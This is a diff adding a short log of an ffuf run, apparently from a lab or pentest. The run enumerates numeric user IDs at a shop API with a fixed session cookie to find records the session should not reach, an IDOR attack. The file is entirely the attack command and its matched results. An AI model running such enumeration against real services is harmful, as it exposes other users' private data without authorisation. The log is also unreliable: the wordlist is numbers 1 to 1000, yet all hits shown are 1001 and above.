@@ -1,0 +1,30 @@
+$ ffuf -w /usr/share/seclists/Fuzzing/numbers-1-1000.txt -u 'http://shop.megacorp.local/api/user/FUZZ' -H 'Cookie: session=eyJ1aWQiOjEwMDF9.aB3xQ' -mc 200 -fs 0 -o idor.json
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://shop.megacorp.local/api/user/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/numbers-1-1000.txt
+ :: Header           : Cookie: session=eyJ1aWQiOjEwMDF9.aB3xQ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Matcher          : Response status: 200
+ :: Filter           : Response size: 0
+________________________________________________
+
+1001                    [Status: 200, Size: 412, Words: 21, Lines: 1, Duration: 44ms]
+1002                    [Status: 200, Size: 388, Words: 19, Lines: 1, Duration: 41ms]
+1003                    [Status: 200, Size: 451, Words: 23, Lines: 1, Duration: 39ms]
+1004                    [Status: 200, Size: 402, Words: 20, Lines: 1, Duration: 47ms]
+1007                    [Status: 200, Size: 429, Words: 22, Lines: 1, Duration: 43ms]
+1010                    [Status: 200, Size: 376, Words: 18, Lines: 1, Duration: 40ms]
+1042                    [Status: 200, Size: 517, Words: 27, Lines: 1, Duration: 52ms]
+:: Progress: [1000/1000] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
